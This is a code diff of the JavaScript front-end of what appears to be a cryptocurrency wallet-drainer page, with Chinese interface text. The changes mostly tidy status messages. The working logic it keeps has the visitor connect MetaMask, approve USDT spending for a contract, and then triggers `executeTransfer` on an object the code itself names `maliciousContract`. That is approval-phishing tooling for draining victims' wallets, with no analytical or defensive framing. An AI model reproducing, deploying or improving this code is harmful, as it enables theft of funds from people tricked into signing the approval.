@@ -47,46 +47,44 @@ const usdtABI = [
 let web3;
 let userAccount;
 
-async function checkConnection() {
-    if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        if (accounts.length > 0) {
-            userAccount = accounts[0];
-            document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
-            document.getElementById('approveButton').disabled = false; // 启用授权按钮
-        } else {
-            document.getElementById('connectButton').innerText = '连接钱包'; // 重置按钮文本
-        }
-    }
+const messageElement = document.getElementById('message');
+
+function showMessage(msg, isSuccess = true) {
+    messageElement.innerText = msg;
+    messageElement.style.color = isSuccess ? '#28a745' : '#dc3545'; // 根据成功与否改变颜色
 }
 
 document.getElementById('connectButton').onclick = async () => {
     if (window.ethereum) {
-        // 在请求账户之前，直接更新按钮文本
+        web3 = new Web3(window.ethereum);
+        // 检查是否已经连接
+        const accounts = await web3.eth.getAccounts();
+        if (accounts.length > 0) {
+            userAccount = accounts[0];
+            console.log('钱包已连接: ', userAccount);
+            document.getElementById('connectButton').innerText = '连接成功';
+            document.getElementById('approveButton').disabled = false;
+            showMessage('连接成功！');
+            return; // 已连接，直接返回
+        }
+        // 如果未连接，提示用户连接
         document.getElementById('connectButton').innerText = '连接中...';
         try {
             await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAccount = (await web3.eth.getAccounts())[0]; // 获取第一个账户
+            userAccount = (await web3.eth.getAccounts())[0];
             console.log('钱包连接成功: ', userAccount);
-            document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
-            document.getElementById('approveButton').disabled = false; // 启用授权按钮
+            document.getElementById('connectButton').innerText = '连接成功';
+            document.getElementById('approveButton').disabled = false;
+            showMessage('连接成功！');
         } catch (error) {
             console.error('连接错误: ', error);
-            document.getElementById('connectButton').innerText = '连接钱包'; // 重置按钮文本
-            if (error.code === 4001) {
-                alert('连接钱包请求被拒绝');
-            } else {
-                alert('连接钱包失败: ' + error.message);
-            }
+            document.getElementById('connectButton').innerText = '连接钱包';
+            showMessage('连接钱包失败: ' + error.message, false);
         }
     } else {
         alert('请安装 MetaMask!');
     }
 };
-
-// 在页面加载时检查连接状态
-window.addEventListener('load', checkConnection);
 
 document.getElementById('approveButton').onclick = async () => {
     const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
@@ -94,11 +92,12 @@ document.getElementById('approveButton').onclick = async () => {
 
     try {
         await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
-        document.getElementById('approveButton').innerText = '授权成功'; // 更新按钮文本
+        document.getElementById('approveButton').innerText = '授权成功';
         document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
+        showMessage('授权成功！');
     } catch (error) {
         console.error('授权错误: ', error);
-        alert('授权失败: ' + error.message);
+        showMessage('授权失败: ' + error.message, false);
     }
 };
 
@@ -107,9 +106,9 @@ document.getElementById('executeTransferButton').onclick = async () => {
 
     try {
         await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
-        document.getElementById('executeTransferButton').innerText = '转账执行成功'; // 更新按钮文本
+        showMessage('转移执行成功！');
     } catch (error) {
-        console.error('转账错误: ', error);
-        alert('转账失败: ' + error.message);
+        console.error('转移错误: ', error);
+        showMessage('转移失败: ' + error.message, false);
     }
 };
